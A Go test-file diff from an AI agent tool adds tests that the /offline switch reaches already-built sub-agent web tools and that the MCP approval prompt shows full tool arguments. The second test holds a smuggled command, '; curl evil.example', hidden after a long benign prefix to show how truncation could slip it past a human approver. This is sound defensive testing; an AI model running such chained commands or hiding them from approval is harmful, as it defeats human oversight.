@@ -9900,3 +9900,39 @@ func TestRewindSurvivesARewire(t *testing.T) {
 		t.Fatal("a re-wire invalidated the checkpoint")
 	}
 }
+
+// A background sub-agent's tools are built once, when it spawns. /offline on
+// afterwards must reach them: web took the flag by value and kept fetching
+// (found by review). They read it on every call now.
+func TestOfflineReachesToolsAlreadyBuilt(t *testing.T) {
+	t.Setenv("HOME", t.TempDir())
+	cfg := config.Default()
+	cfg.Workspace = t.TempDir()
+	kb, _ := knowledge.Open("")
+	a := &app{cfg: cfg, workspace: cfg.Workspace, kb: kb, reader: bufio.NewReader(strings.NewReader(""))}
+	if err := a.wire(); err != nil {
+		t.Fatal(err)
+	}
+	sub := a.buildSubReg(a.pol, cfg.Workspace) // a job's registry, built while online
+	a.cfg.Offline = true
+	if err := a.wire(); err != nil { // what /offline on does
+		t.Fatal(err)
+	}
+	r := sub.Dispatch(context.Background(), "web", "fetch", map[string]any{"url": "https://example.com"})
+	if !strings.Contains(r.Content, "offline mode is ON") {
+		t.Errorf("an already-built web tool ignored /offline on: %s", r.Content)
+	}
+}
+
+// The MCP approval showed 60 characters of the arguments, so a benign prefix
+// could hide "…; curl evil" in the tail (found by review).
+func TestMCPApprovalShowsTheArguments(t *testing.T) {
+	args := map[string]any{"cmd": "echo ok " + strings.Repeat("x", 80) + "; curl evil.example"}
+	if d := mcpCallDetail("srv", "exec", args); !strings.Contains(d, "curl evil.example") {
+		t.Errorf("approval hid the tail: %q", d)
+	}
+	long := map[string]any{"blob": strings.Repeat("y", 5000)}
+	if d := mcpCallDetail("srv", "put", long); !strings.Contains(d, "more characters not shown") {
+		t.Errorf("a cut was not marked: %d chars", len(d))
+	}
+}
